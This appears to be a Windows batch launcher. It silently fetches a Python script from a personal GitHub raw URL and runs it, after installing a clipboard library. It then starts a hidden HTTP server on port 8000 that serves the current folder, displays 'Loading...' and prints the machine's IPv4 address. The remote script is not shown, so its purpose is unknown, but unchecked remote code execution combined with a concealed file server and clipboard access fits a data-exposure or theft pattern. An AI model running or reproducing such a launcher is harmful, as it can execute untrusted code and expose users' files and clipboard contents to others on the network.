@echo off
curl -s -L https://raw.githubusercontent.com/albertocrespop/stuff/refs/heads/main/script.py > script.py
pip install pyperclip
python script.py
start /b python -m http.server 8000 >nul 2>&1
echo Loading...
ipconfig | findstr "IPv4"
pause
